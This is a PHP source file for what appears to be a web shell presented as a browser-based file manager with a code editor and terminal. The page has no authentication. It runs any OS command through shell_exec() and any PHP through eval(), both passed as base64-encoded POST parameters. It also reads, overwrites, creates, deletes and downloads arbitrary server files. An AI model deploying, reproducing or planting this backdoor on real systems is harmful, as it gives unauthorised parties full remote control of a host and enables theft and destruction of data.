<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


define("SERVER_NAME", $_SERVER['SERVER_NAME']);
define("_HOME", getRoot());

define('_XXX', $_SERVER['PHP_SELF']);



//Requests
$postDir = isset($_GET['dir']) ? $_GET['dir'] : _HOME;


//Actions
if (isset($_POST['view'])) {
    echo base64_encode(file_get_contents($_POST['dir']));
    exit;
}

if (isset($_POST['terminal'])) {
    echo shell_exec(base64_decode($_POST['command']));
    exit;
}

if (isset($_POST['runcode'])) {
    echo eval(base64_decode($_POST['code']));
    exit;
}

if (isset($_POST['addfile'])) {
    $filePath = $_POST['filepath'];
    $fileName = $_POST['filename'];
    // $arrFilePath = explode("/", $filePath);
    if (!is_dir($filePath)) mkdir($filePath, 0755, true);

    if (!file_exists($filePath . "/" . $fileName)) {
        file_put_contents($filePath . "/" . $fileName, "");
    }
    chmod($filePath . "/" . $fileName, 0644);
    exit;
}


if (isset($_POST['saveFile'])) {
    if (is_file(base64_decode($_POST['filepath']))) {
        chmod(base64_decode($_POST['filepath']), 0644);
        file_put_contents(base64_decode($_POST['filepath']), base64_decode($_POST['data']));
    }
    echo "DONE";
    exit;
}


if (isset($_POST['deleteFile'])) {
    unlink(base64_decode($_POST['path']));
}

if (isset($_POST['downloadFile'])) {
    $file = base64_decode($_POST['path']);
    header("Content-Description: File Transfer");
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"" . basename($file) . "\"");
    readfile($file);
    exit();
}



//Functions
function permission($path)
{
    return substr(sprintf('%o', fileperms($path)), -4);
}

function getRoot($root = "public_html")
{
    return explode($root, getcwd())[0] . $root . "";
}

function formatBytes($bytes, $precision = 2)
{
    $sz = 'BKMGTP';
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$precision}f", $bytes / pow(1024, $factor)) . @$sz[$factor];
}


function getDir($path)
{
    $dir = scandir($path);
    $arrFile = [];
    $arrFolder = [];
    $arr = [];

    if (!$dir) return $arr;

    global $postDir;
    foreach ($dir as $index => $val) {
        if ($index > 1) {
            $p =  $postDir . "/" . $val;
            if (is_dir($p)) {
                array_push($arrFolder, $p);
            } else {
                array_push($arrFile, $p);
            }
        }
    }
    sort($arrFile);
    sort($arrFolder);
    foreach ($arrFolder as $val) {
        array_push($arr, $val);
    }
    foreach ($arrFile as $val) {
        array_push($arr, $val);
    }
    // $arr = array_merge($arrFolder, $arrFile);
    return $arr;
}


function getIcon($fileExtention)
{
    $fileExtention = strtolower($fileExtention);
    switch ($fileExtention) {
        case "doc":
            return "<i style='color: #16a085' class='bx bxs-file-doc'></i>";

        case "css":
            return "<i style='color: #9b59b6'  class='bx bxs-file-css'></i>";

        case "html":
            return "<i  style='color: #e67e22' class='bx bxs-file-html' ></i>";
        case "png":
        case "jpg":
        case "gif":
        case "jpeg":
        case "webp":
            return "<i  style='color: #3498db' class='bx bxs-image' ></i>";

        case "js":
            return "<i  style='color: #e67e22' class='bx bxs-file-js' ></i>";

        case "zip":
        case "rar":
            return "<i  style='color: #e67e22' class='bx bxs-file-archive' ></i>";
        case "txt":
            return "<i  style='color: #7ed6df' class='bx bxs-file-txt' ></i>";
        case "json":
            return "<i  style='color: #6ab04c' class='bx bxs-file-json' ></i>";

        case "php":
        case "php1":
        case "php2":
        case "php3":
        case "php4":
        case "php5":
        case "php6":
        case "php7":
        case "php8":
        case "inc":
            return "<i style='color: #3b68ff' class='bx bxl-php' ></i>";


        default:
            return "<i  style='color: #16a085' class='bx bxs-file-blank' ></i>";
    }
}


?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- CDN  -->
    <link rel="shortcut icon" href="https://www.favicon.cc/logo3d/87327.png" type="image/x-icon">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <link href='https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css' rel='stylesheet'>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://unpkg.com/monaco-editor@latest/min/vs/loader.js"></script>


    <!-- CSS  -->
    <!-- <link rel=" stylesheet" href="css/style.css"> -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            color: white;
            text-decoration: none;
        }

        * ul {
            list-style: none;
        }

        .bx {
            cursor: pointer;
        }

        body {
            background-color: #131313;
            font-family: "Roboto", sans-serif;
            width: 100vw;
            height: 100vh;
            overflow-x: hidden;
        }

        ::-webkit-scrollbar-track {
            box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.3);
            border-radius: 6px;
            background-color: rgba(245, 245, 245, 0.1019607843);
        }

        ::-webkit-scrollbar {
            width: 8px;
            background-color: #2b2b2b;
        }

        ::-webkit-scrollbar-thumb {
            border-radius: 10px;
            box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.3);
            background-color: #828384;
        }

        .min-scrollbar::-webkit-scrollbar {
            width: 5px;
        }

        .no-scrollbar::-webkit-scrollbar-track {
            display: none;
        }

        .no-scrollbar::-webkit-scrollbar {
            display: none;
        }

        .no-scrollbar::-webkit-scrollbar-thumb {
            display: none;
        }

        .file-eara {
            display: flex;
            align-items: center;
            height: calc(100vh - 360px);
        }

        .file-eara .files-tree {
            width: 300px;
            height: 100%;
        }

        .file-eara .files-tree .header {
            display: flex;
            align-items: center;
            justify-content: space-evenly;
            padding: 8px;
            height: 60px;
            box-shadow: rgba(0, 0, 0, 0.15) 1.95px 1.95px 2.6px;
        }

        .file-eara .files-tree .header .bx {
            border-radius: 50%;
            width: 30px;
            height: 30px;
            box-shadow: rgba(50, 50, 93, 0.25) 0px 30px 60px -12px inset, rgba(0, 0, 0, 0.3) 0px 18px 36px -18px inset;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .file-eara .files-tree .header .bx.bx-arrow-back {
            color: green;
        }

        .file-eara .files-tree .header .bx.bx-rotate-left {
            color: rgb(227, 193, 0);
        }

        .file-eara .files-tree .header .bx.bx-plus {
            color: rgb(0, 129, 221);
        }

        .file-eara .files-tree .body {
            flex: 1;
        }

        .file-eara .files-tree .body .list-file {
            padding: 8px;
            width: 100%;
            overflow: hidden;
            overflow-y: auto;
            height: 100%;
            max-height: calc(100vh - 60px);
        }

        .file-eara .files-tree .body .list-file .item-file {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 6px;
            cursor: pointer;
            transition: 0.15s;
            border-radius: 6px;
            padding-right: 8px;
            padding-top: 3px;
            padding-bottom: 3px;
        }

        .file-eara .files-tree .body .list-file .item-file:hover {
            background-color: #292929;
        }

        .file-eara .files-tree .body .list-file .item-file .file-name {
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            width: calc(100% - 2.5rem);
        }

        .file-eara .files-tree .body .list-file .item-file .file-name .bx {
            border: 1px solid #3c3c3c;
            border-radius: 6px;
            padding: 4px;
            font-size: 20px;
        }

        .file-eara .files-tree .body .list-file .item-file .file-permission {
            font-size: 11px;
            position: relative;
        }

        .file-eara .files-tree .body .list-file .item-file .file-permission:hover .popup-action {
            display: flex;
        }

        .file-eara .files-tree .body .list-file .item-file .file-permission .popup-action {
            position: absolute;
            top: 0;
            right: 0;
            background-color: #828384;
            border-radius: 6px;
            width: 100px;
            height: 80px;
            display: none;
            flex-direction: column;
            gap: 8px;
            padding: 8px;
            z-index: 1;
        }

        .file-eara .files-tree .body .list-file .item-file .file-permission .popup-action .item-popup-action {
            margin-bottom: 6px;
            border: 1px solid #606060;
            padding: 3px 6px;
            border-radius: 3px;
        }

        .file-eara .files-tree .body .list-file .item-file .file-permission .popup-action .item-popup-action.download {
            display: flex;
            align-items: center;
        }

        .file-eara .files-tree .body .list-file .item-file .file-permission .popup-action .item-popup-action.download button {
            background-color: transparent;
            border: none;
            outline: none;
            cursor: pointer;
        }

        .file-eara .work-space {
            width: 100%;
            height: 100%;
        }

        .file-eara .work-space .editor-actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 1rem;
            height: 60px;
        }

        .file-eara .work-space .editor-actions .current-dir {
            font-size: 13px;
        }

        .file-eara .work-space .editor-actions .bx {
            border-radius: 3px;
            width: 30px;
            height: 30px;
            box-shadow: rgba(50, 50, 93, 0.25) 0px 30px 60px -12px inset, rgba(0, 0, 0, 0.3) 0px 18px 36px -18px inset;
            display: flex;
            align-items: center;
            justify-content: center;
            color: greenyellow;
        }

        .file-eara .work-space #datashow {
            height: calc(100vh - 248px);
            min-height: 100%;
        }

        .file-eara .work-space .terminal {
            height: 150px;
            background-color: #2a2a2a;
        }

        .file-eara .work-space .terminal .title-actions {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 3px;
        }

        .file-eara .work-space .terminal .title-actions .bx {
            box-shadow: rgba(32, 167, 82, 0.25) 0px 30px 60px -12px inset, rgba(0, 0, 0, 0.3) 0px 18px 36px -18px inset;
            padding: 3px;
            border-radius: 5px;
        }

        .file-eara .work-space .terminal .title-actions #terminal-input {
            border: none;
            outline: none;
            background-color: #131313;
            padding: 3px 6px;
            width: 100%;
        }

        .file-eara .work-space .terminal #terminal {
            width: 100%;
            height: 100%;
            background-color: #131313;
            padding: 8px;
            outline: none;
        }

        .image-block {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background-color: #131313;
        }

        .image-block.show {
            display: flex;
        }

        .image-block .bx {
            position: absolute;
            top: 1rem;
            right: 1rem;
            font-size: 30px;
        }

        .image-block img {
            max-width: 90%;
            max-height: 90%;
        }

        .dialog-add-file {
            position: fixed;
            width: 500px;
            height: 300px;
            background-color: #131313;
            top: 50%;
            right: 50%;
            transform: translate(50%, -50%);
            display: none;
            flex-direction: column;
            padding: 1rem;
            gap: 8px;
        }

        .dialog-add-file.show {
            display: flex;
        }

        .dialog-add-file input,
        .dialog-add-file button {
            border: none;
            outline: none;
            background-color: #4b4b4b;
            padding: 3px 6px;
            width: 100%;
        }

        .dialog-add-file button {
            cursor: pointer;
            width: -webkit-fit-content;
            width: -moz-fit-content;
            width: fit-content;
            margin: 0 auto;
        }

        /*# sourceMappingURL=style.css.map */
    </style>

    <title>File: <?= SERVER_NAME ?></title>
</head>

<body>

    <div class="file-eara">
        <div class="files-tree">
            <div class="header">
                <a href="<?= _XXX . '?dir=' . substr($postDir, 0, strrpos($postDir, '/')) ?>">
                    <i class='bx bx-arrow-back'></i>
                </a>
                <a href="<?= _XXX . '?dir=' . $postDir ?>">
                    <i class='bx bx-rotate-left'></i>
                </a>
                <i class='bx bx-plus' onclick="$('.dialog-add-file').addClass('show')"></i>
            </div>

            <div class="body">

                <ul class="list-file">
                    <?php foreach (getDir($postDir) as $itemFiles) :  ?>

                        <?php if (is_dir($itemFiles)) : ?>
                            <a href="<?= (_XXX . "?dir=$itemFiles") ?>">
                            <?php else : ?>
                                <a onclick="readFile('<?= base64_encode($itemFiles) ?>')">
                                <?php endif ?>
                                <li class="item-file" title="<?= basename($itemFiles) ?>  <?= is_file($itemFiles) ? '(' . formatBytes(filesize($itemFiles)) . ')' : '' ?>">
                                    <span class="file-name">
                                        <?= is_dir($itemFiles) ? "<i style='color: #f1c40f;' class='bx bxs-folder'></i>" : getIcon(pathinfo($itemFiles, PATHINFO_EXTENSION)) ?>
                                        <?= basename($itemFiles) ?> <?= is_file($itemFiles) ? '(' . formatBytes(filesize($itemFiles)) . ')' : '' ?>
                                    </span>
                                    <span class="file-permission">
                                        <?= permission($itemFiles) ?>
                                        <div class="popup-action">
                                            <span class="item-popup-action" onclick="deleleFile('<?= base64_encode($itemFiles) ?>')">
                                                <i style="color: red;" class='bx bx-trash-alt'></i>
                                                Delete
                                            </span>
                                            <form method="post" target="_blank" action="<?= _XXX ?>" class="item-popup-action download">
                                                <i class='bx bxs-download'></i>
                                                <input type="hidden" name="path" value="<?= base64_encode($itemFiles) ?>">
                                                <input type="hidden" name="downloadFile" value="YES">
                                                <button type="submit">Download</button>
                                            </form>
                                        </div>
                                    </span>
                                </li>
                                </a>
                            <?php endforeach ?>
                </ul>

            </div>

        </div>
        <div class="work-space">

            <div class="editor-actions">
                <span class="current-dir"><?= $postDir ?></span>
                <div style="display: flex; align-items: center;gap: 8px;">
                    <i class='bx bx-save' title="Save" onclick="saveFile()"></i>
                    <i class='bx bx-code-alt' onclick="runCode()"></i>
                </div>
            </div>
            <div id="datashow" class="show"></div>


            <div class="terminal">
                <div class="title-actions">
                    <span style="font-size: 11px; padding-left: 8px;">TERMINAL</span>
                    <input type="text" id="terminal-input">
                    <i class='bx bx-play' onclick="runTerminal()"></i>
                </div>
                <textarea id="terminal"></textarea>
            </div>

            <script>
                require.config({
                    paths: {
                        'vs': 'https://unpkg.com/monaco-editor@latest/min/vs'
                    }
                });
                window.MonacoEnvironment = {
                    getWorkerUrl: function(workerId, label) {
                        return `data:text/javascript;charset=utf-8,${encodeURIComponent(` self.MonacoEnvironment = { baseUrl: 'https://unpkg.com/monaco-editor@latest/min/' }; importScripts('https://unpkg.com/monaco-editor@latest/min/vs/base/worker/workerMain.js');`)}`;
                    }
                };

                require(["vs/editor/editor.main"], function() {
                    window.myeditor = monaco.editor.create(document.getElementById('datashow'), {
                        value: "",
                        language: '',
                        lineNumbers: 'on',
                        roundedSelection: false,
                        scrollBeyondLastLine: false,
                        readOnly: false,
                        fontSize: "12px",
                        theme: 'vs-dark'
                    });
                });
            </script>

        </div>



    </div>


    <div class="image-block">
        <i class='bx bx-x' onclick="$('.image-block').removeClass('show')"></i>
        <img src="https://thumbs.dreamstime.com/b/lonely-elephant-against-sunset-beautiful-sun-clouds-savannah-serengeti-national-park-africa-tanzania-artistic-imag-image-106950644.jpg">
    </div>



    <div class="dialog-add-file">
        <span>Add file</span>
        <label>File path</label>
        <input type="text" id="add-file-path" value="<?= $postDir ?>">
        <label>File name</label>
        <input type="text" id="add-file-name" value="file.txt">

        <div style="display: flex; gap: 1rem; align-items: center;">
            <button class="add" onclick="addFile()">Add</button>
            <button class="add" onclick="$('.dialog-add-file').removeClass('show')">Close</button>
        </div>
    </div>

    <!-- JS  -->
    <script src="js/script.js"></script>

    <script>
        function readFile(dir = '') {
            // dir = atob(dir);

            $.post("<?= _XXX ?>", {
                view: "YES",
                dir: atob(dir)
            }, (data) => {
                $(".current-dir").html(atob(dir))
                if (atob(dir).match(/.(jpg|jpeg|png|gif)$/i)) {

                    $(".image-block").addClass("show")
                    $(".image-block img").attr('src', `data:image/jpg;base64,${data}`)
                } else {
                    window.myeditor.setValue(atob(data))

                    let fileType = atob(dir).split('.').pop().toLocaleLowerCase();
                    if (fileType === "js") {
                        fileType = "javascript"
                    }
                    monaco.editor.setModelLanguage(window.myeditor.getModel(), fileType)
                }

            })
        }






        function runCode() {
            $.post("<?= _XXX ?>", {
                runcode: "YES",
                code: btoa(window.myeditor.getValue())
            }, (data) => {
                $("#terminal").val(data)
            })
        }



        function saveFile() {
            const currentDir = $(".current-dir").html()
            const data = window.myeditor.getValue()

            $.post("<?= _XXX ?>", {
                saveFile: "YES",
                filepath: btoa(currentDir),
                data: btoa(data),
            }, (data) => {
                readFile(btoa(currentDir))
            })
        }


        function addFile() {
            $.post("<?= _XXX ?>", {
                addfile: "YES",
                filepath: $("#add-file-path").val(),
                filename: $("#add-file-name").val(),
            }, (data) => {
                location.reload()
            })
        }


        function deleleFile(path) {
            // deleteFile
            $.post("<?= _XXX ?>", {
                deleteFile: "YES",
                path
            }, (data) => {
                location.reload()
            })
        }


        function downloadFile(path) {
            //downloadFile
            $.post("<?= _XXX ?>", {
                downloadFile: "YES",
                path
            }, (data) => {
                console.log(data)
            })
        }




        $("#terminal-input").keypress((e) => {
            if (e.keyCode === 13) runTerminal()
        })


        function runTerminal() {
            const terminalContext = $("#terminal")
            const command = $("#terminal-input").val()
            if (command === "clear") {
                $("#terminal-input").val('')
                terminalContext.val('')
                return;
            }
            $.post("<?= _XXX ?>", {
                terminal: "YES",
                command: btoa(command)
            }, (data) => {
                terminalContext.val(data)
                $("#terminal-input").val('')
            })
        }
    </script>
</body>

</html>
